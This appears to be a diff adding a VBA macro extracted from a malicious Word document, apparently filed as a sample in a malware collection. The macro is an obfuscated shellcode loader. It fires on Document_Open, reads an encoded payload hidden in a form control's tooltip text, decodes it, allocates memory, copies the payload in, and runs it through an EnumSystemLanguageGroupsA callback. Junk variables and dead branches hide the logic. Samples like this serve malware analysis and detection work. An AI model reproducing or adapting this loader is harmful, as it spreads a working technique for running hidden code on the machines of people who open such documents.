@@ -1,0 +1,153 @@
+Filename     : ./macros/86fc8030862a72bcfb17606c565a751263a02fcb09a2954b16335250cb892e66
+OLE stream   : Macros/VBA/ThisDocument
+VBA filename : ThisDocument.cls
+----------------------------------------
+Attribute VB_Name = "ThisDocument"
+Attribute VB_Base = "1Normal.ThisDocument"
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = True
+Attribute VB_Exposed = True
+Attribute VB_TemplateDerived = True
+Attribute VB_Customizable = True
+Dim jackleg As Integer
+Dim dimorphotheca
+Dim architectonic
+Dim enterprise
+Dim dashed
+Dim boxlike As Long
+Function choler(apochromatic, harumscarum)
+Dim conductor As Variant
+Dim button As Byte
+jackleg = enterprise + 335
+Dim biogenic As Byte
+Dim acquainted As Long
+Dim visaged As String
+Dim daffte As Long
+Dim recognize As Long
+chuckaluck acquainted, ByVal VarPtr(harumscarum) + 8, 4
+jackleg = boxlike / 62
+recognize = apochromatic
+chausse = 57
+firmware = 58
+If chausse + firmware < 39 Then
+chausse = "oc" & Left("cupyshawwal", 4)
+boxlike = enterprise + 86
+flamboyance = "cru" & Left("denesschile", 6)
+Else
+enterprise = enterprise And 119
+firmware = 17
+End If
+
+chuckaluck ByVal recognize, ByVal acquainted, 101 - 66 + 3187
+jackleg = boxlike - 243
+End Function
+
+Function memorabilia()
+Dim milliampere As Variant
+Dim homiletical As Long
+classis = 8
+While classis < 11
+sped = "booklouse"
+classis = classis + 1
+boxlike = jackleg * 3
+Wend
+
+rumination = ThisDocument.Path
+memorabilia = rumination & "/" & ThisDocument.Name
+End Function
+Private Sub Document_Open()
+Dim florentine As String
+Dim ded As Byte
+dendrocolaptidae = "entirely"
+countersignature
+carvelbuilt = 62
+clubbing = 54
+If carvelbuilt + clubbing < 19 Then
+carvelbuilt = Right("psychotherapistcoc", 3) & Right("peahencoidea", 6)
+jackleg = jackleg + 363
+barbaresque = "fa" + "ult"
+Else
+enterprise = enterprise / 315
+clubbing = 57
+End If
+End Sub
+Sub countersignature()
+Dim purchased As Long
+Dim ciconia As String
+intensified = phoxinus.subtonic.ControlTipText
+nystagmus = leprosy.roadbed(intensified)
+acceleration = 5
+While acceleration < 10
+endstopped = LCase("st") + Mid("bionticklbalboa", 6, 4) + "er"
+acceleration = acceleration + 1
+boxlike = enterprise - 257
+Wend
+
+bungle = Left("wacoca", 2) + "tere" + Mid("sportivelydsciotlo", 11, 1)
+#If Win64 Then
+Dim perambulation As Variant
+Dim convalescent As LongPtr
+Dim gringo As String
+#Else
+Dim professorial As Long
+Dim another As Long
+Dim convalescent As Long
+#End If
+wildfowl = 0
+ejectment = "sittidae"
+deportment = 4096
+endoderm = 94
+bluffness = 84
+If endoderm + bluffness < 18 Then
+endoderm = "hu" + UCase("RDLe") + Left("sfantasist", 1)
+dashed = "novelization"
+greatniece = LCase("COm") + LCase("MaNDM") + "ent"
+Else
+enterprise = enterprise / 425
+bluffness = 115
+End If
+
+exaltee = smatterer(262144, 0, 0)
+convalescent = margrave(exaltee, 0, 3287)
+resolvit = "vaudevillian"
+Dim davit As String
+disparagingly = "connubial"
+dago = LCase("pA") & Right("collapsedssu", 3)
+davit = memorabilia
+For biradial = 9 To 63
+despoil = 63
+enterprise = enterprise - 237
+Callout = Mid("bladderwrackindhanemolia", 13, 3) + "elica" + "cy"
+Callout = Left("coabstruse", 2) + "ldly"
+Next biradial
+
+enteron = nystagmus
+orthoscope = UCase("sh") & Left("ipowneraglaonema", 7)
+choler convalescent, enteron
+stands = "capillarity"
+astrakhan = "photogenic"
+#If Win64 Then
+Dim cushy As Integer
+tapestry = UCase("Ine") & Left("xactnbeadsman", 5) & "ess"
+servente = "pretio"
+elastin = 15 + 11 - 99 + 649
+#ElseIf (Win32) Then
+elastin = 86 - 41 - 49 + 510 + 1707
+
+#End If
+Dim clonal As Integer
+Dim dichloride As Long
+Dim christlike As Long
+christlike = 0
+Dim gospel As Long
+gospel = convalescent + elastin
+harms = EnumSystemLanguageGroupsA(gospel, christlike, davit)
+ass = 6
+While ass < 11
+ass = ass + 1
+architectonic = dimorphotheca
+Wend
+
+End Sub
+
